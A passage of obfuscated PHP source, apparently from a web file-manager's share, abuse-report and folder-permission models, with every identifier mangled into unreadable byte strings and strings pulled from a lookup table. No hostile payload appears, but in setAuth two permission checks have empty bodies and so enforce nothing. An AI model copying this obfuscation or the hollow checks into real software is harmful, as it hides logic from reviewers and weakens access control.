$ûêÀô¶»‹¸ù = array($Ö™Ûø®§…ó[1894] => $´¸ê¿¹Óó, $Ö™Ûø®§…ó[1895] => $œÇú×Æ£¨[$Ö™Ûø®§…ó[364]]); return $ûêÀô¶»‹¸ù; } protected function shareAdd($Õ§·†ôÚ€ã, $ŸöâÜœ÷’í) { $ŞŸÕ =& $_SERVER[èÍ×öˆøÉ]; $èŒŒ = $this->_addShareData($Õ§·†ôÚ€ã, $ŸöâÜœ÷’í); if (!empty($ŸöâÜœ÷’í[$ŞŸÕ[1896]])) { $this->_shareAuthSet($èŒŒ, $ŸöâÜœ÷’í[$ŞŸÕ[1896]]); } $this->shareEventAdd($Õ§·†ôÚ€ã, $ŸöâÜœ÷’í, $ŞŸÕ[1097]); return $èŒŒ; } protected function shareAddSystem($¤äØ¨ôéç, $±ëó¥Ö) { $ñ£àë²ù«ëªÜ =& $_SERVER[èÍ×öˆøÉ]; $š‰Ææö = $this->_addShareData($¤äØ¨ôéç, $±ëó¥Ö, $ñ£àë²ù«ëªÜ[1209]); $this->_shareAuthSet($š‰Ææö, $±ëó¥Ö[$ñ£àë²ù«ëªÜ[1896]]); return $š‰Ææö; } private function shareEventAdd($ë²ÉÅŸå, $ìœ, $€–ü¤’ = "\x61\x64\x64") { $ú¤˜®Ğá¶ =& $_SERVER[èÍ×öˆøÉ]; if (!$ë²ÉÅŸå || $ë²ÉÅŸå == $ú¤˜®Ğá¶[191]) { return; } if ($€–ü¤’ == $ú¤˜®Ğá¶[1097]) { if ($ìœ[$ú¤˜®Ğá¶[487]] == $ú¤˜®Ğá¶[87]) { Model($ú¤˜®Ğá¶[558])->eventShare($ë²ÉÅŸå, $ú¤˜®Ğá¶[1897]); } if ($ìœ[$ú¤˜®Ğá¶[489]] == $ú¤˜®Ğá¶[87]) { Model($ú¤˜®Ğá¶[558])->eventShare($ë²ÉÅŸå, $ú¤˜®Ğá¶[1898]); } return; } $‚ÏØ‘“™Ã“Ä = $this->getInfoByPath($ë²ÉÅŸå); $æ„áÍŒ¯ = $ú¤˜®Ğá¶[1899]; if ($‚ÏØ‘“™Ã“Ä[$ú¤˜®Ğá¶[487]] == $ú¤˜®Ğá¶[191] && $ìœ[$ú¤˜®Ğá¶[487]] == $ú¤˜®Ğá¶[87]) { $æ„áÍŒ¯ = $ú¤˜®Ğá¶[1897]; } if ($‚ÏØ‘“™Ã“Ä[$ú¤˜®Ğá¶[487]] == $ú¤˜®Ğá¶[87] && $ìœ[$ú¤˜®Ğá¶[487]] == $ú¤˜®Ğá¶[191]) { $æ„áÍŒ¯ = $ú¤˜®Ğá¶[1900]; } if ($‚ÏØ‘“™Ã“Ä[$ú¤˜®Ğá¶[489]] == $ú¤˜®Ğá¶[191] && $ìœ[$ú¤˜®Ğá¶[489]] == $ú¤˜®Ğá¶[87]) { $æ„áÍŒ¯ = $ú¤˜®Ğá¶[1898]; } if ($‚ÏØ‘“™Ã“Ä[$ú¤˜®Ğá¶[489]] == $ú¤˜®Ğá¶[87] && $ìœ[$ú¤˜®Ğá¶[489]] == $ú¤˜®Ğá¶[191]) { $æ„áÍŒ¯ = $ú¤˜®Ğá¶[1901]; } Model($ú¤˜®Ğá¶[558])->eventShare($ë²ÉÅŸå, $æ„áÍŒ¯); return; } private function _addShareData($ü–ş®¦ùüñÆÁ, $íÃ¦¿¼úøºë = array(), $‚©òƒ”«Èºò = false) { $¶Âû‡ËŠ´İé =& $_SERVER[èÍ×öˆøÉ]; $ÄöôœÖò = $‚©òƒ”«Èºò == $¶Âû‡ËŠ´İé[1209] ? 0 : USER_ID; $Øµ = array($¶Âû‡ËŠ´İé[412] => $ü–ş®¦ùüñÆÁ, $¶Âû‡ËŠ´İé[1573] => $ÄöôœÖò); if ($ü–ş®¦ùüñÆÁ == 0) { $Øµ = array($¶Âû‡ËŠ´İé[1902] => $íÃ¦¿¼úøºë[$¶Âû‡ËŠ´İé[1109]], $¶Âû‡ËŠ´İé[1573] => $ÄöôœÖò); } if ($ÄÁÀ„€ = $this->where($Øµ)->find()) { return $ÄÁÀ„€[$¶Âû‡ËŠ´İé[482]]; } if ($ü–ş®¦ùüñÆÁ == 0) { $ĞÉ÷ìË = array($¶Âû‡ËŠ´İé[28] => get_path_this($íÃ¦¿¼úøºë[$¶Âû‡ËŠ´İé[76]])); } else { $ĞÉ÷ìË = Model($¶Âû‡ËŠ´İé[827])->sourceInfo($ü–ş®¦ùüñÆÁ); if (!$ĞÉ÷ìË) { return !1; } } if (!$íÃ¦¿¼úøºë[$¶Âû‡ËŠ´İé[1485]]) { $íÃ¦¿¼úøºë[$¶Âû‡ËŠ´İé[1485]] = $ĞÉ÷ìË[$¶Âû‡ËŠ´İé[28]]; } $›ˆàçÖş‹ÏÆ = array($¶Âû‡ËŠ´İé[1573] => $ÄöôœÖò, $¶Âû‡ËŠ´İé[412] => $ü–ş®¦ùüñÆÁ, $¶Âû‡ËŠ´İé[1485] => $¶Âû‡ËŠ´İé[33], $¶Âû‡ËŠ´İé[487] => 0, $¶Âû‡ËŠ´İé[489] => 0, $¶Âû‡ËŠ´İé[1109] => $¶Âû‡ËŠ´İé[33], $¶Âû‡ËŠ´İé[305] => $¶Âû‡ËŠ´İé[33], $¶Âû‡ËŠ´İé[889] => $¶Âû‡ËŠ´İé[33], $¶Âû‡ËŠ´İé[1903] => 0, $¶Âû‡ËŠ´İé[1904] => 0, $¶Âû‡ËŠ´İé[490] => 0, $¶Âû‡ËŠ´İé[491] => $¶Âû‡ËŠ´İé[33], $¶Âû‡ËŠ´İé[484] => $¶Âû‡ËŠ´İé[33]); $£Ñáˆ‡™¬ÂÇ = explode($¶Âû‡ËŠ´İé[47], $¶Âû‡ËŠ´İé[1905]); foreach ($£Ñáˆ‡™¬ÂÇ as $´ƒÈáİÆÙ¦ú) { if (!isset($íÃ¦¿¼úøºë[$´ƒÈáİÆÙ¦ú])) { continue; } $›ˆàçÖş‹ÏÆ[$´ƒÈáİÆÙ¦ú] = $íÃ¦¿¼úøºë[$´ƒÈáİÆÙ¦ú]; } $Õª = $this->add($›ˆàçÖş‹ÏÆ); $›—È§ = array($¶Âû‡ËŠ´İé[484] => short_id($Õª)); $this->where(array($¶Âû‡ËŠ´İé[481] => $Õª))->save($›—È§); return $Õª; } private function _shareAuthSet($ÃÃõ®«š‡ì¹, $Ëìêºº«»Ü»Ç) { $éŞä÷³™Ñ =& $_SERVER[èÍ×öˆøÉ]; if (!is_array($Ëìêºº«»Ü»Ç)) { return !1; } $½‹Ô‘¯ûÒÙÑ³ = Model($éŞä÷³™Ñ[1856]); $½‹Ô‘¯ûÒÙÑ³->where(array($éŞä÷³™Ñ[482] => $ÃÃõ®«š‡ì¹))->delete(); $Õ­ = array(); foreach ($Ëìêºº«»Ü»Ç as $ÀÄ) { $¬¡Š¡“åˆÁÇ = SourceModel::TYPE_USER; if ($ÀÄ[$éŞä÷³™Ñ[406]] == SourceModel::TYPE_GROUP) { $¬¡Š¡“åˆÁÇ = SourceModel::TYPE_GROUP; } $Ÿó“ÛÇ—«ì = array($éŞä÷³™Ñ[482] => $ÃÃõ®«š‡ì¹, $éŞä÷³™Ñ[406] => $¬¡Š¡“åˆÁÇ, $éŞä÷³™Ñ[498] => intval($ÀÄ[$éŞä÷³™Ñ[498]]), $éŞä÷³™Ñ[1852] => 0, $éŞä÷³™Ñ[1906] => -1); if ($ÀÄ[$éŞä÷³™Ñ[1852]]) { $Ÿó“ÛÇ—«ì[$éŞä÷³™Ñ[1852]] = $ÀÄ[$éŞä÷³™Ñ[1852]]; } else { if ($ÀÄ[$éŞä÷³™Ñ[1906]]) { $Ÿó“ÛÇ—«ì[$éŞä÷³™Ñ[1906]] = $ÀÄ[$éŞä÷³™Ñ[1906]]; } } $Õ­[] = $Ÿó“ÛÇ—«ì; } return $½‹Ô‘¯ûÒÙÑ³->addAll($Õ­, array(), !0); } public function numViewAdd($³ÙñÄ) { $õò± =& $_SERVER[èÍ×öˆøÉ]; $µÎ½šÍ¨İ = array($õò±[481] => $³ÙñÄ); $this->where($µÎ½šÍ¨İ)->setAdd($õò±[1903]); } public function numDownloadAdd($á–) { $´ê =& $_SERVER[èÍ×öˆøÉ]; $ƒË‰· = array($´ê[481] => $á–); $this->where($ƒË‰·)->setAdd($´ê[1904]); } protected function shareEdit($Ñ¹¢¶×•ğ¨ü, $¹Îïœ¨¹¤) { $êË–ªßÜ =& $_SERVER[èÍ×öˆøÉ]; $ô¾¶İ = $this->getInfo($Ñ¹¢¶×•ğ¨ü); if (!$ô¾¶İ) { return !1; } $this->_checkLinkShare($¹Îïœ¨¹¤, $ô¾¶İ); $›Û´ó = array(); $š¸  = explode($êË–ªßÜ[47], $êË–ªßÜ[1907]); foreach ($š¸  as $ ) { if (!array_key_exists($ , $¹Îïœ¨¹¤)) { continue; } $›Û´ó[$ ] = $¹Îïœ¨¹¤[$ ]; } $this->shareEventAdd($ô¾¶İ[$êË–ªßÜ[397]], $¹Îïœ¨¹¤, $êË–ªßÜ[1718]); $this->where(array($êË–ªßÜ[481] => $Ñ¹¢¶×•ğ¨ü))->save($›Û´ó); if (isset($¹Îïœ¨¹¤[$êË–ªßÜ[1896]])) { $this->_shareAuthSet($Ñ¹¢¶×•ğ¨ü, $¹Îïœ¨¹¤[$êË–ªßÜ[1896]]); } return !0; } private function _checkLinkShare($øÀ, $É¬Ø“ó¨) { $™Ş³ç™Ú¬– =& $_SERVER[èÍ×öˆøÉ]; if ($øÀ[$™Ş³ç™Ú¬–[487]] != $™Ş³ç™Ú¬–[87]) { return; } $« = $É¬Ø“ó¨[$™Ş³ç™Ú¬–[85]][$™Ş³ç™Ú¬–[397]]; if ($É¬Ø“ó¨[$™Ş³ç™Ú¬–[85]][$™Ş³ç™Ú¬–[29]] != $™Ş³ç™Ú¬–[193]) { $ò° = $this->_folderReport($«); if (!$ò°) { return; } show_json(LNG($™Ş³ç™Ú¬–[1908]) . $™Ş³ç™Ú¬–[1909] . $ò°, !1); } $Ç°²» = Model($™Ş³ç™Ú¬–[827])->fileInfoGet($É¬Ø“ó¨[$™Ş³ç™Ú¬–[85]][$™Ş³ç™Ú¬–[397]]); if (!$Ç°²») { return; } $ÚûÆã£²û° = $this->shareFileMeta($Ç°²»[$™Ş³ç™Ú¬–[461]]); if (isset($ÚûÆã£²û°[$™Ş³ç™Ú¬–[372]]) && $ÚûÆã£²û°[$™Ş³ç™Ú¬–[372]] == $™Ş³ç™Ú¬–[87]) { show_json(LNG($™Ş³ç™Ú¬–[1910]), !1); } } private function _folderReport($Ê¦ªÂëí) { $®å¨¯Æ®´ é– =& $_SERVER[èÍ×öˆøÉ]; $¿•›ˆ®¢×ÛùÀ = array($®å¨¯Æ®´ é–[461] => array($®å¨¯Æ®´ é–[1009], 0), $®å¨¯Æ®´ é–[745] => 3); $·Îßô« = Model($®å¨¯Æ®´ é–[1911])->where($¿•›ˆ®¢×ÛùÀ)->field($®å¨¯Æ®´ é–[461])->select(); if (!$·Îßô«) { return !1; } $·Îßô« = array_to_keyvalue($·Îßô«, $®å¨¯Æ®´ é–[33], $®å¨¯Æ®´ é–[461]); $âğ = $®å¨¯Æ®´ é–[47] . $Ê¦ªÂëí . $®å¨¯Æ®´ é–[47]; $¿•›ˆ®¢×ÛùÀ = array($®å¨¯Æ®´ é–[461] => array($®å¨¯Æ®´ é–[7], $·Îßô«), $®å¨¯Æ®´ é–[515] => array($®å¨¯Æ®´ é–[381], "\x25{$âğ}\x25"), $®å¨¯Æ®´ é–[425] => 0); $øôõß‹£Ò‰ä = Model($®å¨¯Æ®´ é–[827])->where($¿•›ˆ®¢×ÛùÀ)->field($®å¨¯Æ®´ é–[1912])->find(); if (!$øôõß‹£Ò‰ä) { return !1; } $”ì = substr($øôõß‹£Ò‰ä[$®å¨¯Æ®´ é–[515]], strpos($øôõß‹£Ò‰ä[$®å¨¯Æ®´ é–[515]], $âğ)); $¿•›ˆ®¢×ÛùÀ = array($®å¨¯Æ®´ é–[397] => array($®å¨¯Æ®´ é–[7], trim($”ì, $®å¨¯Æ®´ é–[47]))); $”‘†¥›¨ = Model($®å¨¯Æ®´ é–[827])->where($¿•›ˆ®¢×ÛùÀ)->field($®å¨¯Æ®´ é–[28])->select(); $ºİï½ùé‚°î = array_to_keyvalue($”‘†¥›¨, $®å¨¯Æ®´ é–[33], $®å¨¯Æ®´ é–[28]); $ºİï½ùé‚°î[] = $øôõß‹£Ò‰ä[$®å¨¯Æ®´ é–[28]]; return implode($®å¨¯Æ®´ é–[8], $ºİï½ùé‚°î); } protected function remove($›) { $Çİ£Ş¦« =& $_SERVER[èÍ×öˆøÉ]; if (is_array($›)) { $› = array($Çİ£Ş¦«[7], $›); } $ìö¯Öµ¿Å = array($Çİ£Ş¦«[482] => $›); $à¶ßİÍ = $this->where($ìö¯Öµ¿Å)->delete(); if ($à¶ßİÍ) { Model($Çİ£Ş¦«[590])->where(array($Çİ£Ş¦«[482] => $›))->delete(); } $˜âµ˜Í”Ïû¦Š = is_array($›) ? $›[1] : array($›); for ($ÛË£Œ…ÇŒ¨› = 0; $ÛË£Œ…ÇŒ¨› < count($˜âµ˜Í”Ïû¦Š); $ÛË£Œ…ÇŒ¨›++) { $·×ä¿»Ú = $this->getInfo($˜âµ˜Í”Ïû¦Š[$ÛË£Œ…ÇŒ¨›]); if ($·×ä¿»Ú[$Çİ£Ş¦«[489]] == $Çİ£Ş¦«[87]) { Model($Çİ£Ş¦«[558])->eventShare($·×ä¿»Ú[$Çİ£Ş¦«[397]], $Çİ£Ş¦«[1901]); } if ($·×ä¿»Ú[$Çİ£Ş¦«[487]] == $Çİ£Ş¦«[87]) { Model($Çİ£Ş¦«[558])->eventShare($·×ä¿»Ú[$Çİ£Ş¦«[397]], $Çİ£Ş¦«[1900]); } } return $à¶ßİÍ; } protected function removeBySource($—¶æú) { $ıÓ­–Û =& $_SERVER[èÍ×öˆøÉ]; $ïÚîª¾è¥¯» = array($ıÓ­–Û[412] => array($ıÓ­–Û[413], $—¶æú)); $„õÒÊè = $this->field($ıÓ­–Û[482])->where($ïÚîª¾è¥¯»)->select(); $„õÒÊè = array_to_keyvalue($„õÒÊè, $ıÓ­–Û[33], $ıÓ­–Û[482]); if (!$„õÒÊè) { return; } $ïÚîª¾è¥¯» = array($ıÓ­–Û[481] => array($ıÓ­–Û[413], $„õÒÊè)); $this->where($ïÚîª¾è¥¯»)->delete(); Model($ıÓ­–Û[590])->where($ïÚîª¾è¥¯»)->delete(); } public function listAll($ÖÜî) { $•òË—Î =& $_SERVER[èÍ×öˆøÉ]; $·ñü€—Á¿ = array(); if ($ÖÜî[$•òË—Î[1582]]) { $·ñü€—Á¿[$•òË—Î[1582]] = $ÖÜî[$•òË—Î[1582]]; } if ($ÖÜî[$•òË—Î[756]]) { $Ï¥·ã›ºŠµñÒ = $ÖÜî[$•òË—Î[490]] ? $ÖÜî[$•òË—Î[490]] : strtotime(date($•òË—Î[1913])); $·ñü€—Á¿[$•òË—Î[194]] = array($•òË—Î[331], array($ÖÜî[$•òË—Î[756]], $Ï¥·ã›ºŠµñÒ)); } if ($ÖÜî[$•òË—Î[29]]) { $·ñü€—Á¿[$ÖÜî[$•òË—Î[29]]] = 1; } else { $·ñü€—Á¿[] = array($•òË—Î[487] => array($•òË—Î[1009], 0), $•òË—Î[489] => array($•òË—Î[1009], 0), $•òË—Î[1890] => $•òË—Î[1844]); } if ($ÖÜî[$•òË—Î[1840]]) { $·ñü€—Á¿[] = array($•òË—Î[484] => $ÖÜî[$•òË—Î[1840]], $•òË—Î[1485] => array($•òË—Î[381], "\45{$ÖÜî[$•òË—Î[1840]]}\x25"), $•òË—Î[1890] => $•òË—Î[1844]); } $°‚Ã³Š„ŠíÓ = $this->_makeOrder()->where($·ñü€—Á¿)->selectPage(20); if (empty($°‚Ã³Š„ŠíÓ[$•òË—Î[367]])) { return array(); } $this->_listDataApply($°‚Ã³Š„ŠíÓ[$•òË—Î[367]]); return $°‚Ã³Š„ŠíÓ; } public function listDataApply($Ü¿) { $this->_listDataApply($Ü¿); return $Ü¿; } private function _listDataApply(&$ñ¨) { $ÆÑøœÓÀÏ =& $_SERVER[èÍ×öˆøÉ]; $œç¾ ¢òßßÒ = array_to_keyvalue($ñ¨, $ÆÑøœÓÀÏ[33], $ÆÑøœÓÀÏ[1582]); $ğÓ¯‰ÖĞ«Ö£¤ = Model($ÆÑøœÓÀÏ[532])->userListInfo(array_unique($œç¾ ¢òßßÒ)); $³…‘ = array_to_keyvalue($ñ¨, $ÆÑøœÓÀÏ[33], $ÆÑøœÓÀÏ[397]); $°Àó¹¿ = Model($ÆÑøœÓÀÏ[827])->sourceListInfo($³…‘, !0); foreach ($ñ¨ as $ğŞ¥Ú™ => &$Ş´) { $éÀ = $Ş´[$ÆÑøœÓÀÏ[1582]]; $Ş´[$ÆÑøœÓÀÏ[1914]] = $ğÓ¯‰ÖĞ«Ö£¤[$éÀ] ? $ğÓ¯‰ÖĞ«Ö£¤[$éÀ] : !1; $´ÇÚÖµç³ˆ = $Ş´[$ÆÑøœÓÀÏ[397]]; $Ş´[$ÆÑøœÓÀÏ[85]] = $°Àó¹¿[$´ÇÚÖµç³ˆ] ? $°Àó¹¿[$´ÇÚÖµç³ˆ] : !1; if ($Ş´[$ÆÑøœÓÀÏ[85]][$ÆÑøœÓÀÏ[425]] == $ÆÑøœÓÀÏ[87]) { unset($ñ¨[$ğŞ¥Ú™]); } if ($Ş´[$ÆÑøœÓÀÏ[85]] != $ÆÑøœÓÀÏ[191] && !$Ş´[$ÆÑøœÓÀÏ[85]]) { unset($ñ¨[$ğŞ¥Ú™]); } } unset($Ş´); $ñ¨ = array_values($ñ¨); } private function _makeOrder($ÔÙ§°– = '') { $­­² =& $_SERVER[èÍ×öˆøÉ]; $Ë÷ = array($­­²[194], $­­²[490], $­­²[1903], $­­²[1904]); $Şı‘¡ = array($­­²[442] => $­­²[443], $­­²[444] => $­­²[445]); $ëÊ = Input::get($­­²[449], $­­²[7], $­­²[418], $Ë÷); $é—ê = Input::get($­­²[450], $­­²[7], $­­²[1915], array($­­²[1839], $­­²[444])); $é—ê = $Şı‘¡[$é—ê]; $ÔÙ§°– = $ÔÙ§°– . "{$ëÊ}\40{$é—ê}"; return $this->order($ÔÙ§°–); } public function reportAdd($Ÿ˜›¿‹—ÂÔ¯¥) { $ó• =& $_SERVER[èÍ×öˆøÉ]; $ãÚ©õûÃ˜ø = array($ó•[482] => $Ÿ˜›¿‹—ÂÔ¯¥[$ó•[482]], $ó•[1582] => USER_ID); if (Model($ó•[1911])->where($ãÚ©õûÃ˜ø)->find()) { return !1; } $ûˆÙïÍ¯˜†Ñ = array($ó•[482] => $Ÿ˜›¿‹—ÂÔ¯¥[$ó•[482]], $ó•[1485] => $Ÿ˜›¿‹—ÂÔ¯¥[$ó•[1485]], $ó•[397] => $Ÿ˜›¿‹—ÂÔ¯¥[$ó•[397]], $ó•[461] => $Ÿ˜›¿‹—ÂÔ¯¥[$ó•[461]], $ó•[1582] => USER_ID, $ó•[29] => $Ÿ˜›¿‹—ÂÔ¯¥[$ó•[29]], $ó•[445] => $Ÿ˜›¿‹—ÂÔ¯¥[$ó•[445]]); return Model($ó•[1911])->add($ûˆÙïÍ¯˜†Ñ); } public function reportList($ÓŞüİŸ) { $ëî =& $_SERVER[èÍ×öˆøÉ]; $°Æï × = array(); if ($ÓŞüİŸ[$ëî[756]]) { $ı×óê· = $ÓŞüİŸ[$ëî[490]] ? $ÓŞüİŸ[$ëî[490]] : strtotime(date($ëî[1913])); $°Æï ×[$ëî[194]] = array($ëî[331], array($ÓŞüİŸ[$ëî[756]], $ı×óê·)); } if (isset($ÓŞüİŸ[$ëî[29]]) && in_array($ÓŞüİŸ[$ëî[29]], array($ëî[87], $ëî[429], $ëî[1916], $ëî[1917], $ëî[1918]))) { $°Æï ×[$ëî[29]] = $ÓŞüİŸ[$ëî[29]]; } if (isset($ÓŞüİŸ[$ëî[745]]) && in_array($ÓŞüİŸ[$ëî[745]], array($ëî[191], $ëî[87], $ëî[429], $ëî[1916]))) { $°Æï ×[$ëî[745]] = $ÓŞüİŸ[$ëî[745]]; } $ãâ±öÑ˜ = Input::get($ëî[450], $ëî[7], $ëî[1915], array($ëî[1839], $ëî[444])); $àŒ = array($ëî[442] => $ëî[443], $ëî[444] => $ëî[445]); $ì°®ÑŒÓ = $ëî[1919] . $àŒ[$ãâ±öÑ˜]; $è¨Éñİåëü = Model($ëî[1911])->where($°Æï ×)->order($ì°®ÑŒÓ)->selectPage(20); if (empty($è¨Éñİåëü[$ëî[367]])) { return array(); } $Î‰’öáŞä = array_to_keyvalue_group($è¨Éñİåëü[$ëî[367]], $ëî[745], $ëî[482]); if (!empty($Î‰’öáŞä[0])) { $ÓŞüİŸ = $Î‰’öáŞä[0]; $°Æï × = array($ëî[482] => array($ëî[7], $ÓŞüİŸ)); $íÌ‰”±’Áœ¤ = $this->where($°Æï ×)->field($ëî[482])->select(); $íÌ‰”±’Áœ¤ = array_to_keyvalue($íÌ‰”±’Áœ¤, $ëî[33], $ëî[482]); $Ğ‹¤™ÃÃä = array_diff($ÓŞüİŸ, $íÌ‰”±’Áœ¤); if (!empty($Ğ‹¤™ÃÃä)) { foreach ($è¨Éñİåëü[$ëî[367]] as $‹Û–³´½ => $½ş¾) { if (in_array($½ş¾[$ëî[482]], $Ğ‹¤™ÃÃä)) { unset($è¨Éñİåëü[$ëî[367]][$‹Û–³´½]); } } } } $this->_listDataApply($è¨Éñİåëü[$ëî[367]]); return $è¨Éñİåëü; } public function reportStatus($€ƒª—) { $Ø»İò›Í˜ =& $_SERVER[èÍ×öˆøÉ]; $¾üó = array($Ø»İò›Í˜[395] => $€ƒª—[$Ø»İò›Í˜[395]]); $ËÙ©• = Model($Ø»İò›Í˜[1911])->where($¾üó)->field($Ø»İò›Í˜[1920])->find(); if (!$ËÙ©•) { return !1; } $İş© = array($Ø»İò›Í˜[745] => $€ƒª—[$Ø»İò›Í˜[745]]); if ($€ƒª—[$Ø»İò›Í˜[745]] == $Ø»İò›Í˜[1916] && $ËÙ©•[$Ø»İò›Í˜[745]] == $Ø»İò›Í˜[1916]) { $İş©[$Ø»İò›Í˜[745]] = 0; } $îõ±œ© = Model($Ø»İò›Í˜[1911])->where($¾üó)->save($İş©); if ($€ƒª—[$Ø»İò›Í˜[745]] == $Ø»İò›Í˜[429]) { if ($ËÙ©•[$Ø»İò›Í˜[461]] != $Ø»İò›Í˜[191] && $this->shareFileMeta($ËÙ©•[$Ø»İò›Í˜[461]])) { $this->shareFileMeta($ËÙ©•[$Ø»İò›Í˜[461]], 0); } $this->remove($ËÙ©•[$Ø»İò›Í˜[482]]); return !0; } if ($îõ±œ© && $€ƒª—[$Ø»İò›Í˜[745]] == $Ø»İò›Í˜[1916]) { $çù‘¯ıÊ„Ç’ = $İş©[$Ø»İò›Í˜[745]] == $Ø»İò›Í˜[1916] ? 1 : 0; $this->shareFileMeta($ËÙ©•[$Ø»İò›Í˜[461]], $çù‘¯ıÊ„Ç’); $this->removeByFile($ËÙ©•[$Ø»İò›Í˜[461]]); } return $îõ±œ©; } private function removeByFile($Ÿƒ¤²–Ş…¥â) { $úœ•€İÄ =& $_SERVER[èÍ×öˆøÉ]; $ê–³Ù  = Model($úœ•€İÄ[827])->where(array($úœ•€İÄ[461] => $Ÿƒ¤²–Ş…¥â))->field($úœ•€İÄ[397])->select(); $ÍŒûÑÍ¾”ó° = array_to_keyvalue($ê–³Ù , $úœ•€İÄ[33], $úœ•€İÄ[397]); $è§ = array($úœ•€İÄ[397] => array($úœ•€İÄ[7], $ÍŒûÑÍ¾”ó°), $úœ•€İÄ[487] => 1); $ê–³Ù  = $this->where($è§)->field($úœ•€İÄ[482])->select(); if (empty($ê–³Ù )) { return; } $çËÚ = array_to_keyvalue($ê–³Ù , $úœ•€İÄ[33], $úœ•€İÄ[482]); $this->remove($çËÚ); } private function shareFileMeta($—ŠË±ë, $Î¨ıøÁ = null) { $Ÿõğú =& $_SERVER[èÍ×öˆøÉ]; $ìì½üãÂª¼ = array($Ÿõğú[461] => $—ŠË±ë, $Ÿõğú[93] => $Ÿõğú[1921]); if (is_null($Î¨ıøÁ)) { return Model($Ÿõğú[1922])->where($ìì½üãÂª¼)->find(); } $ìì½üãÂª¼[$Ÿõğú[372]] = $Î¨ıøÁ; Model($Ÿõğú[1922])->add($ìì½üãÂª¼, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\x63\145\137\x61\165\x74\x68"; public function getAuth($çÄİ±³) { $ê‹İ·Ú =& $_SERVER[èÍ×öˆøÉ]; $€‹ı÷¶ = $this->sourceAuthSelect($çÄİ±³); $ëã»ùÒÂ = array(); $¸£ø = array(); $ÅÃµè = 2 << 25; foreach ($€‹ı÷¶ as $¬ÃÓä) { $Ôëñô¯Çë¢ = Model($ê‹İ·Ú[501])->listData($¬ÃÓä[$ê‹İ·Ú[1852]]); if (!$Ôëñô¯Çë¢) { continue; } $ëã»ùÒÂ[] = $¬ÃÓä; $ĞØ«¡Ÿ³ˆú = 0; if ($¬ÃÓä[$ê‹İ·Ú[406]] == SourceModel::TYPE_GROUP) { $ĞØ«¡Ÿ³ˆú = $ÅÃµè * 2; } if ($¬ÃÓä[$ê‹İ·Ú[406]] == SourceModel::TYPE_USER) { $ĞØ«¡Ÿ³ˆú = $ÅÃµè; } if ($¬ÃÓä[$ê‹İ·Ú[406]] == SourceModel::TYPE_USER && $¬ÃÓä[$ê‹İ·Ú[498]] == $ê‹İ·Ú[191]) { $ĞØ«¡Ÿ³ˆú = 0; } $¸£ø[] = $Ôëñô¯Çë¢[$ê‹İ·Ú[408]] + $ĞØ«¡Ÿ³ˆú; } array_multisort($¸£ø, SORT_DESC, $ëã»ùÒÂ); return $ëã»ùÒÂ; } public function sourceAuthSelect($×Ä¶) { $œÅ =& $_SERVER[èÍ×öˆøÉ]; static $®Àı‹ Ú¿ä™ = array(); $ØÈ = is_array($×Ä¶) ? !1 : !0; if ($ØÈ) { $×Ä¶ = array($×Ä¶); } $§É´ëÒÈôÒ× = array(); foreach ($×Ä¶ as $œ˜¤‹´ı¯Í) { if (isset($®Àı‹ Ú¿ä™[$œ˜¤‹´ı¯Í])) { $§É´ëÒÈôÒ×[$œ˜¤‹´ı¯Í] = $®Àı‹ Ú¿ä™[$œ˜¤‹´ı¯Í]; } } if (count($§É´ëÒÈôÒ×) == count($×Ä¶)) { return $ØÈ ? $§É´ëÒÈôÒ×[$×Ä¶[0]] : $§É´ëÒÈôÒ×; } $è­§½ = $œÅ[1923]; $ş’‚§ıçÜ = array($œÅ[397] => array($œÅ[7], $×Ä¶)); $È¡»¼¼¹ÅÃÁ = $this->field($è­§½)->order($œÅ[395])->where($ş’‚§ıçÜ)->select(); $á±ŒáÉ³î = array_to_keyvalue_group($È¡»¼¼¹ÅÃÁ, $œÅ[397]); foreach ($×Ä¶ as $œ˜¤‹´ı¯Í) { $®Àı‹ Ú¿ä™[$œ˜¤‹´ı¯Í] = $á±ŒáÉ³î[$œ˜¤‹´ı¯Í] ? $á±ŒáÉ³î[$œ˜¤‹´ı¯Í] : array(); } if ($ØÈ) { return $È¡»¼¼¹ÅÃÁ; } return $á±ŒáÉ³î; } public function setAuth($¶è¾ò’æÑ„, $‹ËóÜÉè) { $³¼’«İ =& $_SERVER[èÍ×öˆøÉ]; $¬±Ë¡ş€Æ = Model($³¼’«İ[1256])->sourceInfo($¶è¾ò’æÑ„); if (!$¬±Ë¡ş€Æ) { return !1; } if ($¬±Ë¡ş€Æ[$³¼’«İ[406]] != SourceModel::TYPE_GROUP) { return !1; } $ÃœÜ†ÔàÈ—Â = 1; $Â‰ûåò¢…¡ = $¬±Ë¡ş€Æ[$³¼’«İ[498]]; if ($Â‰ûåò¢…¡ != $ÃœÜ†ÔàÈ—Â) { $³—Ì‚÷‡ = array($³¼’«İ[1749] => $Â‰ûåò¢…¡); $¥ÏùéÁ = Model($³¼’«İ[1838])->field($³¼’«İ[1582])->where($³—Ì‚÷‡)->select(); $¥ÏùéÁ = array_to_keyvalue($¥ÏùéÁ, $³¼’«İ[33], $³¼’«İ[1582]); } $óÄ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¡´¦ = array(); foreach ($‹ËóÜÉè as $ªÊœºÄôİ¡) { if (!in_array($ªÊœºÄôİ¡[$³¼’«İ[406]], $óÄ)) { show_json(LNG($³¼’«İ[1924]), !1); } if ($Â‰ûåò¢…¡ != $ÃœÜ†ÔàÈ—Â) { if ($ªÊœºÄôİ¡[$³¼’«İ[406]] == SourceModel::TYPE_GROUP) { } if ($ªÊœºÄôİ¡[$³¼’«İ[498]] != 0 && !in_array($ªÊœºÄôİ¡[$³¼’«İ[498]], $¥ÏùéÁ)) { } } if ($ªÊœºÄôİ¡[$³¼’«İ[498]] == 0) { $ªÊœºÄôİ¡[$³¼’«İ[406]] = SourceModel::TYPE_USER; } $¡´¦[] = array($³¼’«İ[397] => $¶è¾ò’æÑ„, $³¼’«İ[406] => intval($ªÊœºÄôİ¡[$³¼’«İ[406]]), $³¼’«İ[498] => intval($ªÊœºÄôİ¡[$³¼’«İ[498]]), $³¼’«İ[1852] => intval($ªÊœºÄôİ¡[$³¼’«İ[1852]]) ? intval($ªÊœºÄôİ¡[$³¼’«İ[1852]]) : 0, $³¼’«İ[1906] => intval($ªÊœºÄôİ¡[$³¼’«İ[1906]]) ? intval($ªÊœºÄôİ¡[$³¼’«İ[1906]]) : -1); } $this->where(array($³¼’«İ[412] => $¶è¾ò’æÑ„))->delete(); $this->addAll($¡´¦); return !0; } public function authClear($·é³) { $ä¬ñÍÓ¦•Ø² =& 